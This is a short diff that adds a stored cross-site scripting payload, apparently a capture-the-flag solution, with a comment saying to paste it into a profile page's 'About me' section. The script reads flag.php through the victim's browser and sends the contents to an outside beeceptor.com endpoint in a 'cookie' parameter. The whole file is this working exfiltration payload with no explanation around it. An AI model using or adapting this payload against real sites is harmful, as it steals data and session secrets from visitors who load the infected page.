@@ -1,0 +1,16 @@
+// Please execute the code on the profile page --> About me section
+
+<script>
+var xhttp2=new XMLHttpRequest();
+xhttp2.onreadystatechange=function() 
+{
+	if(xhttp2.readyState==4&&xhttp2.status==200){
+
+		var xhttp = new XMLHttpRequest()
+		xhttp.open("GET", "https://lilywang.free.beeceptor.com/?cookie="+ xhttp2.responseText, true)
+		xhttp.send()
+	}
+}
+xhttp2.open("GET", "flag.php", true)
+xhttp2.send()
+</script>
